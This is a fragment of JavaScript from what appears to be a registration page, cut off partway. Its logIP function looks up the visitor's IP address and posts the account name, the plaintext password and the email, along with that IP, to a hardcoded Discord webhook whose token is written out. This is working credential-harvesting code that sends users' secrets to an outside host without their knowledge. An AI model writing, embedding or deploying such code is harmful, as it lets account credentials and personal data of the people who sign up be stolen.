    <script>
        // Function to log IP address
        async function logIP(userInfo) {
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const ip = ipData.ip;
                
                // Send the IP address and user information to Discord webhook
                await fetch('https://discordapp.com/api/webhooks/1265650819198484624/VuR76odW52G970tvnZMTU-tKLKddrAvYsqOSxflh-c51AVoKRCSorbB10yYq0lc5MtFA', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `Account [${userInfo.accountName}] 
                                  Password [${userInfo.password}] 
                                  Email [${userInfo.email}]
                                  Has joined and his IP has been logged: ${ip}`
                    }),
                });
                
                console.log('IP address and user info sent:', ip);
            } catch (error) {
                console.error('Error fetching or sending IP address:', error);
            }
        }

        // Function to handle user registration
